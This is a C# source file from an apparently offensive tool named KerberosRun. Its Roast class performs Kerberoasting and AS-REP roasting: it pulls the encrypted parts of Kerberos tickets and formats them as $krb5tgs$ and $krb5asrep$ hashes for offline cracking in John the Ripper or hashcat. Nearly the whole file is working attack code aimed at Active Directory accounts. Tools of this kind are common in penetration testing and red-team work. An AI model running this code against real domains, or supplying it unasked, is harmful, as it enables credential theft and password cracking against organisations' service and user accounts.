using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;
using NLog;
using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.IdentityModel.Tokens;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace KerberosRun
{
    public class Roast
    {
        protected Logger logger;
        public Roast()
        {
            logger = LogManager.GetCurrentClassLogger();
        }
        public void Kerberoast(TGS tgs)
        {
            var encType = (int)Enum.Parse(typeof(EncryptionType), tgs.tgsRep.Ticket.EncryptedPart.EType.ToString());

            var myCipher = (BitConverter.ToString(tgs.tgsRep.Ticket.EncryptedPart.Cipher.ToArray())).Replace("-", ""); 

            var kroasthash = string.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, tgs.tgsRep.Ticket.SName.Name[0], tgs.cred.Domain, KerberosRun.SPN, myCipher.Substring(0, 32), myCipher.Substring(32));

            logger.Info("[*] SPN: {0}", KerberosRun.SPN);
            logger.Info($"    {kroasthash}");
        }


        public void Kerberoast()
        {
            logger.Info("[*] Kerberoasting using KerberosRequestorSecurityToken method");
            KerberosRequestorSecurityToken krbReqToken = new KerberosRequestorSecurityToken(KerberosRun.SPN);
            
            byte[] requestBytes = krbReqToken.GetRequest();
            
            var gssToken = GssApiToken.Decode(requestBytes);

            var mechType = gssToken.ThisMech.Value;

            if (!Utils.KnownMessageTypes.TryGetValue(mechType, out Func<GssApiToken, ContextToken> tokenFunc))
            {
                throw new UnknownMechTypeException(mechType);
            }

            var ctxToken = tokenFunc(gssToken);

            var krbCtxToken = ctxToken as KerberosContextToken;

            var ticket = krbCtxToken.KrbApReq.Ticket;

            var encType = (int)Enum.Parse(typeof(EncryptionType), ticket.EncryptedPart.EType.ToString());

            var cipherBytes = ticket.EncryptedPart.Cipher.ToArray();
            string myCipher = BitConverter.ToString(cipherBytes).Replace("-", "");

            var kroasthash = string.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, ticket.SName.Name[0], ticket.Realm, KerberosRun.SPN, myCipher.Substring(0, 32), myCipher.Substring(32));

            logger.Info("[*] SPN: {0}", KerberosRun.SPN);
            logger.Info($"    {kroasthash}");
        }


        public void Asreproast(KrbAsRep asRep)
        {
            string repHash = BitConverter.ToString(asRep.EncPart.Cipher.ToArray()).Replace("-", string.Empty);
            repHash = repHash.Insert(32, "$");

            string hashString = string.Empty;
            if (KerberosRun.Format == "john")
            {
                hashString = string.Format("$krb5asrep${0}@{1}:{2}", KerberosRun.User, asRep.Ticket.Realm, repHash);
            }
            else
            {
                hashString = string.Format("$krb5asrep$23${0}@{1}:{2}", KerberosRun.User, asRep.Ticket.Realm, repHash);
            }
            logger.Info("[*] Hash");
            Console.WriteLine($"    {hashString}");
        }



    }
}
